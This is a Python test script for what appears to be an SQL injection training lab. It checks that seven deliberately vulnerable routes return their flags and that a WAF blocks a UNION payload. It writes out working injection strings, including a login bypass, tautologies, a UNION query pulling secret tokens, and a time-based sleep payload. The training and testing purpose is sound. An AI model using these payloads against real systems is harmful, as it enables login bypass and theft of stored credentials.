"""
Direct unit testing of lab routines without Starlette TestClient event loop issues.
"""

import sys
from pathlib import Path

# Add backend directory to sys.path so 'app' is found regardless of cwd
backend_dir = Path(__file__).resolve().parent
if str(backend_dir) not in sys.path:
    sys.path.insert(0, str(backend_dir))

from app.core.database import init_db
from app.labs.lab_routes import (
    lab1_login,
    LoginRequest,
    lab2_search,
    lab3_product_id,
    lab4_employees,
    lab5_user_check,
    lab6_order_status,
    lab7_feedback,
    FeedbackRequest,
)
from app.waf.engine import waf_engine
from app.playground.executor import execute_playground_query, PlaygroundExecuteRequest


def run_tests():
    print("[*] Initializing database...")
    init_db(force=True)

    print("[*] Testing Lab 1: Login auth...")
    res = lab1_login(LoginRequest(username="admin' --", password="xyz", mode="vulnerable"))
    assert res.success is True, "Lab 1 failed"
    assert res.flag == "FLAG{RED_TEAM_AUTH_BYPASS_99}"
    print("  -> Lab 1 Passed!")

    print("[*] Testing Lab 2: Search LIKE...")
    res = lab2_search(query="' OR 1=1 --", mode="vulnerable")
    print("Lab 2 res data:", res.data)
    print("Lab 2 flag:", res.flag)
    print("Lab 2 error:", res.error)
    assert res.flag == "FLAG{SEARCH_UNLISTED_ASSET_FOUND_42}"
    print("  -> Lab 2 Passed!")

    print("[*] Testing Lab 3: Numeric SKU...")
    res = lab3_product_id(id="1 OR 1=1", mode="vulnerable")
    assert res.flag == "FLAG{NUMERIC_ID_TAUTOLOGY_31}"
    print("  -> Lab 3 Passed!")

    print("[*] Testing Lab 4: UNION injection...")
    res = lab4_employees(
        department="' UNION SELECT id, access_key, secret_token FROM secret_credentials --",
        mode="vulnerable",
    )
    assert res.flag == "FLAG{UNION_DATA_EXFILTRATED_77}"
    print("  -> Lab 4 Passed!")

    print("[*] Testing Lab 5: Boolean blind PIN...")
    res = lab5_user_check(username="admin", pin_guess="7492", mode="vulnerable")
    assert res.flag == "FLAG{BLIND_BOOLEAN_PIN_DISCOVERED}"
    print("  -> Lab 5 Passed!")

    print("[*] Testing Lab 6: Error-based...")
    res = lab6_order_status(order_code="'", mode="vulnerable")
    assert res.flag == "FLAG{ERROR_BASED_VERSION_LEAKED_55}"
    print("  -> Lab 6 Passed!")

    print("[*] Testing Lab 7: Time-based blind...")
    res = lab7_feedback(
        FeedbackRequest(author="tester", comments="test'); SELECT sleep(2); --", mode="vulnerable")
    )
    print("Lab 7 duration:", res.duration_ms)
    print("Lab 7 error:", res.error)
    print("Lab 7 message:", res.message)
    assert res.duration_ms >= 1500
    assert res.flag == "FLAG{TIME_BASED_LATENCY_CRACKED_88}"
    print("  -> Lab 7 Passed!")

    print("[*] Testing WAF engine...")
    waf_res = waf_engine.inspect_payload("' UNION SELECT 1,2,3 --")
    assert waf_res.verdict == "BLOCKED"
    waf_clean = waf_engine.inspect_payload("Normal innocent text")
    assert waf_clean.verdict == "ALLOWED"
    print("  -> WAF Engine Passed!")

    print("[*] Testing Playground...")
    pg_res = execute_playground_query(
        PlaygroundExecuteRequest(
            query_template="SELECT id, username FROM users WHERE username = '{INPUT}';",
            payload="' OR '1'='1",
            target_param="username",
        )
    )
    assert pg_res.row_count > 1
    print("  -> Playground Passed!")

    print("\n[+] ALL DIRECT BACKEND TESTS PASSED SUCCESSFULLY!")


if __name__ == "__main__":
    run_tests()
